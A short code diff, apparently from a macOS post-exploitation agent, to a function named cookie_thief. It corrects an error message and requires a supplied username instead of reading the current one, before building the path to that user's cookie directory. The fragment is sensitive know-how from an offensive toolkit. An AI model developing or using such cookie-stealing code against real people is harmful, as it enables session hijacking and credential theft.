@@ -14,14 +14,14 @@ exports.cookie_thief = function(task, command, params){
         password = config['password'];
     }
     else {
-      return {'user_output': "Must supply a the user's login password", "completed": true, "status": "error"};
+      return {'user_output': "Must supply the user's login password", "completed": true, "status": "error"};
     }
 
     if(config.hasOwnProperty("username") && typeof config['username'] == 'string' && config['username']) {
         username = config['username'];
     }
     else {
-        username = $.NSUserName().js;
+        return {'user_output': "Must supply the username", "completed": true, "status": "error"};
     }
     cookiepath = homedir + username + "/";
 
